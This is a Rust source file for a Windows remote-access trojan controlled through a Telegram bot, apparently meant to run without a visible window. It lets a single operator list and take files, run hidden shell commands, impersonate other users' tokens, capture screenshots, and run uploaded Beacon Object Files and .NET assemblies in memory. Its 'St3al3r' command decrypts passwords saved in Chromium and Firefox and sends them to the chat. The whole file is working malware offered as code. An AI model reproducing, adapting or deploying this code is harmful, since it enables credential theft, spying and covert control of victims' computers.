#![windows_subsystem = "windows"]
#![feature(c_variadic)]
#![feature(core_intrinsics)]
use std::{cmp::min, path::{Path, PathBuf}, process::Stdio};
use color_eyre::Result;
mod loader;
use loader::{beacon_pack::BeaconPack, Coffee};
use teloxide::{
    prelude::*,
    types::{Update, UserId, Document, InputFile},
    utils::command::BotCommands, net::Download,
};
use tokio::{fs, io::{BufReader, AsyncBufReadExt}};
use tokio::process::Command as Task;
use crate::screen_capture::save_screenshot;
use chrono::{DateTime, Utc, Timelike, Datelike};
use imputils::*;

use clroxide::clr::Clr;

pub mod imputils;
mod chromium;
mod firefox;
mod screen_capture;
mod screenshot_lib;

static mut O: String = String::new();
static mut TOK: Vec<String> = Vec::new();

#[tokio::main]
async fn main() -> Result<()> {
    color_eyre::install()?;
    let bot = Bot::new("0123456789:XXXXxXXxxxXxX3x3x-3X-XxxxX3XXXXxx3X");
    
    let parameters = ConfigParameters {bot_maintainer: UserId(9876543210)};

    let handler = Update::filter_message()
        .branch(
            dptree::filter(|cfg: ConfigParameters, msg: Message| {
                msg.from().map(|user| user.id == cfg.bot_maintainer).unwrap_or_default()
            })
            .branch(
                dptree::entry()
                    .filter_command::<SimpleCommand>()
                    .endpoint(simple_commands_handler),
            )
        )
        .branch(
            Message::filter_document().endpoint(|bot: Bot, msg: Message, doc: Document| async move {
                if doc.clone().file_name.unwrap().ends_with(".o") {
                    let mut bytes = Vec::new();
                    bot.download_file(&(bot.get_file(doc.file.id).send().await?).path, &mut bytes).await?;
                    let parts: Vec<&str> = msg.caption().unwrap_or("").split_whitespace().collect();
                    let arguments = hexlify_args(parts.iter().map(|&s| s.to_string()).collect()).ok().unwrap();
                    let unhexilified = unhexilify_args(arguments.as_str()).ok().unwrap();
                    Coffee::new(&bytes).unwrap().execute(
                        Some(unhexilified.as_ptr()),
                        Some(unhexilified.len()),
                        None,
                    ).unwrap_or(());
                    unsafe {
                        send_large_message(&bot, msg.chat.id, format!("[+] Bof replay:\n\n{}", O)).await;
                    }
                } else {
                    if let Some(caption) = msg.caption() {


                        let args: Vec<&str> = caption.split_whitespace().collect();
                        if args[0] == "/clr" {
                            let mut bytes = Vec::new();
                            bot.download_file(&(bot.get_file(doc.file.id).send().await?).path, &mut bytes).await?;
                            let args_as_strings: Vec<String> = args.iter().skip(1).map(|s| s.to_string()).collect();

                            let mut res = String::new();
                            if let Ok(mut clr) = Clr::new(bytes, args_as_strings) {
                                res = clr.run().unwrap();
                            }
                            send_large_message(&bot, msg.chat.id, format!("[+] .NET assembly output: {}", res)).await;
                        } else {
                            if Path::new(caption).exists() {
                                let file = bot.get_file(&doc.file.id).await?;
                                let mut dst = fs::File::create(format!("{}{}", caption, doc.file_name.clone().unwrap())).await?;
                                bot.download_file(&file.path, &mut dst).await?;
                                bot.send_message(msg.chat.id, format!("[+] Saved to: {}{}", caption, doc.file_name.unwrap())).send().await?;
                            }
                        }
                    } else {
                        bot.send_message(msg.chat.id, "[-] Specify destination path").send().await?;
                    }
                }
                Ok(())
            }),
        );

    Dispatcher::builder(bot, handler)
        .dependencies(dptree::deps![parameters])
        .default_handler(|_upd| async move {
        })
        .error_handler(LoggingErrorHandler::with_custom_text(
            "An error has occurred in the dispatcher",
        ))
        .enable_ctrlc_handler()
        .build()
        .dispatch()
        .await;
    Ok(())
}

#[derive(Clone)]
struct ConfigParameters {
    bot_maintainer: UserId,
}

async fn simple_commands_handler(
    cfg: ConfigParameters,
    bot: Bot,
    msg: Message,
    cmd: SimpleCommand,
) -> Result<(), teloxide::RequestError> {
    match cmd {
        SimpleCommand::Help => {
            if msg.from().unwrap().id == cfg.bot_maintainer {
                bot.send_message(msg.chat.id, format!("{}\n",SimpleCommand::descriptions())).await?;
            }
        }
        SimpleCommand::ShowDir => {
            let message_text = msg.text().unwrap();
            if message_text.len() <= 9 {
                bot.send_message(msg.chat.id, "[-] empty path").await?;
            } else {
                let path = &message_text[9..];
                if Path::new(path).exists() {
                    if Path::new(path).is_dir() {
                        let result = std::fs::read_dir(path);
                        if result.is_ok() {
                            let paths = result.unwrap();
                            let mut text_files = "".to_string();
                            let mut text_dirs = "".to_string();
                            for path in paths {
                                if path.is_err() {} else {
                                    if Path::new(path.as_ref().unwrap().path().to_str().unwrap()).is_dir() {
                                        text_dirs.push_str(&*format!("📂{}",
                                                                     path.as_ref().unwrap().path().to_str().unwrap())
                                        );
                                        text_dirs.push_str("\n\n");
                                    } else {
                                        let metadata = std::fs::metadata(Path::new(path.as_ref().unwrap().path().to_str().unwrap()));
                                        let m_bytes: String;
                                        if metadata.is_ok() {
                                            let bytes = metadata.unwrap().len();
                                            m_bytes = format!("[{:.2} MBytes]", (bytes as f64) / 1024.0f64 / 1024.0f64);
                                        } else {
                                            m_bytes = "[size unknown]".to_string();
                                        }
                                        text_files.push_str(&*format!("📄{}  {}",
                                                                      path.as_ref().unwrap().path().to_str().unwrap(),
                                                                      m_bytes)
                                        );
                                        text_files.push_str("\n\n");
                                    }
                                }
                            }
                            let mut text = "".to_string();
                            text.push_str(&*text_dirs);
                            text.push_str(&*text_files);
                            if text.len() == 0 {
                                let _ = bot.send_message(msg.chat.id, "[!] empty directory").await;
                            } else {
                                const MESSAGE_MAX_SIZE: usize = 3500;
                                let text_vec = text.chars().collect::<Vec<_>>();
                                let message_count = (text_vec.len() + MESSAGE_MAX_SIZE - 1) / MESSAGE_MAX_SIZE;
                                for i in 0..message_count {
                                    if message_count == 1 {
                                        let _ = bot.send_message(msg.chat.id,
                                                         &text.to_string()).await;
                                    } else {
                                        let part_of_text = format!("[message is too long, show part {} of {}]\n\n{}", i + 1, message_count,
                                                                   text_vec[i * MESSAGE_MAX_SIZE..min(text_vec.len(), (i + 1) * MESSAGE_MAX_SIZE)].iter().cloned().collect::<String>());
                                        let _ = bot.send_message(msg.chat.id, part_of_text).await;
                                    }
                                }
                            }
                        } else {
                            bot.send_message(msg.chat.id, "[-] unable to read directory").await?;
                        }
                    } else {
                        bot.send_message(msg.chat.id, "[-] path leads to file, not direcotory").await?;
                    }
                }
            }
        }
        SimpleCommand::SendFile => {
            let message_text = msg.text().unwrap();
            if message_text.len() <= 10 {
                bot.send_message(msg.chat.id, "[-] empty path").await?;
            } else {
                let path = &message_text[10..];
                if Path::new(path).exists() {
                    if Path::new(path).is_file() {
                        let result = bot.send_document(msg.chat.id, InputFile::file(
                            PathBuf::from(path))).await;
                        if result.is_err() {
                            bot.send_message(msg.chat.id, format!("[-] {}", result.err().unwrap().to_string())).await?;
                        }
                    } else {
                        bot.send_message(msg.chat.id, "[-] path leads to directory, not file").await?;
                    }
                } else {
                    bot.send_message(msg.chat.id, "[-] path does not exists").await?;
                }
            }
        }
        SimpleCommand::Task => {
            let message_text = msg.text().unwrap();
            if message_text.len() <= 6 {
                bot.send_message(msg.chat.id, "Error: empty task").await?;
            } else {
                let task = &message_text[6..];
                let args: Vec<&str> = task.split_whitespace().collect();
                let mut command = Task::new(args[0]);
                let mut output_msg = String::new();
                if args.len() >= 2 {
                    command.args(&args[1..]).creation_flags(0x08000000);
                }
                match command.stdout(Stdio::piped()).spawn() {
                    Ok(result) => {
                        let stdout = result.stdout.expect("[-] Process stdout failed");
                        let reader = BufReader::new(stdout);
                        let mut lines = reader.lines();
            
                        while let Some(line) = lines
                            .next_line()
                            .await
                            .expect("[-] Error reading cmd output lines")
                        {
                            output_msg += &format!("{}\n", &line);
                        }
                        bot.send_message(msg.chat.id, &format!("[+] Output:\n\n{}", &output_msg)).await?;
                    }
                    Err(err) => {
                        output_msg += &format!("[-] Error executing command: {}", err).to_string();
                        bot.send_message(msg.chat.id, &format!("[-] Error:\n\n{}", &output_msg)).await?;
                    }
                }
            }
        }
        SimpleCommand::Imperun => {
            let message_text = msg.text().unwrap();
            if message_text.len() <= 9 {
                bot.send_message(msg.chat.id, "Error: no arguments found").await?;
            } else {
                let task = &message_text[9..];
                let args: Vec<&str> = task.split_whitespace().collect();
                let mode = args[0];
                unsafe {
                    TOK = Vec::new();
                }
                if mode == "list" {
                    let res = se_priv_enable();
                    match res {
                        Ok(_s) => bot.send_message(msg.chat.id, "[+] SeImpersonatePrivilege enabled").await?,
                        Err(err) => bot.send_message(msg.chat.id, format!("[-] Failed to run se_priv_enable(): {}", err)).await?,
                    };
                    let res = enum_token();
                    match res.clone() {
                        Ok(_s) => {
                            unsafe {
                                send_large_message(&bot, msg.chat.id, format!("[+] Enumerated Tokens\n\n{}", TOK.join("\n"))).await;
                            }
                        },
                        Err(err) => {
                            bot.send_message(msg.chat.id, format!("[-] Failed to run enum_token(): {}", err)).await?;
                        }
                    };
                } else if mode == "exec" {
                    let task = String::from(args[2..].join(" "));
                    if let Some(first_arg) = args.get(1) {
                        if let Ok(parsed_pid) = first_arg.parse::<u32>() {
                            let res = se_priv_enable();
                            match res {
                                Ok(_s) => bot.send_message(msg.chat.id, "[+] SeImpersonatePrivilege enabled").await?,
                                Err(err) => bot.send_message(msg.chat.id, format!("[-] Failed to run se_priv_enable(): {}", err)).await?,
                            };
                            let res = impersonate(parsed_pid, task);
                            match res.clone() {
                                Ok(_s) => {
                                    unsafe {
                                        send_large_message(&bot, msg.chat.id, format!("[+] Imperun exec output:\n\n{}", TOK.join(""))).await;
                                    }
                                },
                                Err(err) => {
                                    unsafe {
                                        bot.send_message(msg.chat.id, format!("[+] Imperun exec output:\n\n{}", TOK.join(""))).await;
                                    }
                                    bot.send_message(msg.chat.id, format!("[?] Info: {}", err)).await?;
                                }
                            };
                        } else {
                            bot.send_message(msg.chat.id, "Failed to parse PID as u32").await?;
                        }
                    } else {
                        bot.send_message(msg.chat.id, "No PID provided").await?;
                    }
                }
            }
        }
        SimpleCommand::Screenshot => {
            let message_text = msg.text().unwrap();
            if message_text.len() != 11 {
                bot.send_message(msg.chat.id, "Error: no arguments needed").await?;
            } else {
                let screen_data = save_screenshot();
                let vec = screen_data.into_inner();
                let now: DateTime<Utc> = Utc::now();
                send_image_withcaption(&bot, msg.chat.id, vec, format!(
                    "[IMAGE] {} {:02} {:02} {:02}:{:02}:{:02}", now.year(), now.month(), now.day(), now.hour(), now.minute(), now.second())).await;
            }
        }
        SimpleCommand::St3al3r => {
            let message_text = msg.text().unwrap();
            if message_text.len() != 8 {
                bot.send_message(msg.chat.id, "Error: no arguments needed").await?;
            } else {
                let accvec = chromium::main::chrome_main();
                let vec_dec_acc = accvec.iter()
                .flat_map(|dumper| dumper.accounts.clone())
                .collect::<Vec<_>>();
                let mut output_msg = String::new();
                for account in &vec_dec_acc {
                    output_msg += &format!(
                        "\n\nWebsite: {}\nUsername: {}\nPassword: {}",
                        account.website, account.username_value, account.pwd
                    );
                }

                bot.send_message(msg.chat.id, &format!("[+] Output for Chromium Browsers:\n{}", &output_msg)).await?;

                let ff_logins = firefox::firefox::get_all_logins().await.ok();
                if ff_logins.is_some() {
                    let mut formatted_logins = vec![];
                    for (site, login) in ff_logins.unwrap().iter() {
                        formatted_logins.push(format!(
                            "\nWebsite: {}\n{}",
                            site,
                            format!(
                                "{}",
                                login.iter().map(|f| f.to_string()).collect::<String>()
                            )
                        ));
                    }

                    let mut output_msg = String::new();
                    output_msg += &format!("{}\n", formatted_logins.join("\n"));
                    bot.send_message(msg.chat.id, &format!("[+] Output for Firefox Browser:\n{}", &output_msg)).await?;
                }
            }
        }
    };
    Ok(())
}

#[derive(BotCommands, Clone)]
#[command(rename_rule = "lowercase", description = "These commands are supported:")]
enum SimpleCommand {
    #[command(description = "shows this message.")]
    Help,
    #[command(description = "show directory")]
    ShowDir,
    #[command(description = "send file")]
    SendFile,
    #[command(description = "task to do")]
    Task,
    #[command(description = "impersonate and run")]
    Imperun,
    #[command(description = "take screenshot")]
    Screenshot,
    #[command(description = "extract passwords from the browser")]
    St3al3r,
}

fn unhexilify_args(value: &str) -> Result<Vec<u8>> {
    if value.len() % 2 != 0 {
        panic!("Invalid argument hexadecimal string");
    }

    let bytes: Result<Vec<u8>, _> = (0..value.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&value[i..i + 2], 16))
        .collect();

    Ok(bytes?)
}


fn hexlify_args(args: Vec<String>) -> Result<String> {
    let mut beacon_pack = BeaconPack::new();

    for arg in args {
        let tokens: Vec<&str> = arg.splitn(2, ':').collect();
        if tokens.len() != 2 {
            panic!("Invalid argument format! Expected: <type>:<value>, Example: str:HelloWorld or int:123");
        }

        let argument_type = tokens[0].trim();
        let argument_value = tokens[1].trim();

        match argument_type {
            "str" => beacon_pack.add_str(argument_value),
            "wstr" => beacon_pack.add_wstr(argument_value),
            "int" => {
                if let Ok(int_value) = argument_value.parse::<i32>() {
                    beacon_pack.add_int(int_value);
                } else {
                    panic!("Invalid integer value");
                }
            }
            "short" => {
                if let Ok(short_value) = argument_value.parse::<i16>() {
                    beacon_pack.add_short(short_value);
                } else {
                    panic!("Invalid short value");
                }
            }
            _ => panic!("Invalid argument type"),
        }
    }

    let hex_buffer = beacon_pack
        .get_buffer()
        .iter()
        .map(|b| format!("{:02X}", b))
        .collect();

    Ok(hex_buffer)
}


async fn send_large_message(bot: &Bot, chat_id: ChatId, text: String) -> Result<(), Box<dyn std::error::Error>> {
    const MESSAGE_MAX_SIZE: usize  = 3500;
    let text_vec = text.chars().collect::<Vec<_>>();
    let message_count = (text_vec.len() + MESSAGE_MAX_SIZE - 1) / MESSAGE_MAX_SIZE;
    for i in 0..message_count {
        if message_count == 1 {
            let _ = bot.send_message(chat_id,&text.to_string()).await;
        } else {
            let part_of_text = format!("[message is too long, show part {} of {}]\n\n{}", i + 1, message_count,
                                        text_vec[i * MESSAGE_MAX_SIZE..min(text_vec.len(), (i + 1) * MESSAGE_MAX_SIZE)].iter().cloned().collect::<String>());
            let _ = bot.send_message(chat_id, part_of_text).await;
        }
    }

    Ok(())
}

async fn send_image_withcaption(bot: &Bot, chat_id: ChatId, vec: Vec<u8>, caption: String) {
    let _ = bot.send_photo(chat_id, InputFile::memory(vec)).caption(caption).await;
}